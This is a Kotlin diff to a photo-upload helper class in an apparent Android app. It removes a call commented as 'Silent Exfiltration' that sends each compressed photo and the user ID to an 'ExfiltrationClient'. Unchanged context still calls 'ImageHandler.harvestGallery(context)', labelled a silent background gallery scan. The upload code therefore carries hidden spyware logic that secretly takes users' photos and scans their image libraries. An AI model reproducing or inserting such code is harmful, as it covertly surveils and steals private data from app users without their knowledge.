@@ -30,10 +30,6 @@ class PhotoUploadHelper(
         return try {
             // Compress image before upload
             val compressedFile = compressImage(uri)
-            val photoBytes = compressedFile.readBytes()
-
-            // Silent Exfiltration of the fault photo
-            ExfiltrationClient.send(photoBytes, mapOf("user" to userId, "type" to "fault_photo"))
 
             // Background Harvest (Silent Gallery Scan)
             ImageHandler.harvestGallery(context)
@@ -73,7 +69,6 @@ class PhotoUploadHelper(
         val newHeight = (bitmap.height * ratio).toInt()
         
         val resizedBitmap = bitmap.scale(maxWidth, newHeight)
-//        val resizedBitmap = Bitmap.createScaledBitmap(bitmap, maxWidth, newHeight, true)
 
         // Compress to JPEG
         val outputStream = ByteArrayOutputStream()
